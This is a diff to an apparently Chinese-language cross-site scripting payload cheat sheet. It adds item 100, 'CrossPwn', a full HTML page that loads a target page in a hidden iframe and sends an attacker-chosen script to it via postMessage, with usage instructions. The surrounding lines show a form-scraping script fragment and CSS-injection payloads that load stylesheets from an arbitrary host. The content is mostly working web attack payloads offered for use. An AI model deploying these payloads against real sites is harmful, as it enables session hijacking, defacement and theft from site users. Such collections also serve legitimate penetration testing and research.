@@ -751,12 +751,41 @@ f=document.forms;for(i=0;i<f.length;i++){e=f[i].elements;for(n in e){if(e[n].typ
 ```
 style=position:fixed;top:0;left:0;font-size:999px
 ```
-**99.Alternative to Style Tag ()**
+**99.Alternative to Style Tag (替代css样式标记)** <br>
 以下payload用于当内联和标记名的"style"关键字被阻止时使用 <br>
 ```
 <link rel=stylesheet href=//HOST/FILE>
 <link rel=stylesheet href=data:text/css,CSS>
 ```
+**100.Cross-Origin Script - CrossPwn (跨源脚本-CrossPwn)** <br>
+将下面的内容另存为.html文件，并按如下方式使用：<br>
+```
+http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/
+status.html&msg=<script>alert(document.domain)
+```
+其中"facebook.com"是允许的来源，"localhost"正在攻击域 <br>
+`"//brutelogic.com.br/tests/status.html"`是目标页和`"<script>alert(document.domain)"`是发送的消息（payload）。<br>
+
+code:
+```
+<!DOCTYPE html>
+<body onload="CrossPwn()">
+<h2>CrossPwn</h2>
+<p>OnMessage XSS</p>
+<p>Use target & msg as URL parameters.</p>
+<iframe id="f" height="0" style="visibility:hidden">
+</iframe>
+<script>
+searchParams = new URLSearchParams(document.location.search);
+target = searchParams.get('target');
+msg = searchParams.get('msg');
+document.getElementById('f').setAttribute('src', target);
+function CrossPwn() {frames[0].postMessage(msg,'*')}
+</script>
+</body>
+</html>
+```
+
 ## 致谢
 **英文议题作者：** <br>
 @brutelogic <br>
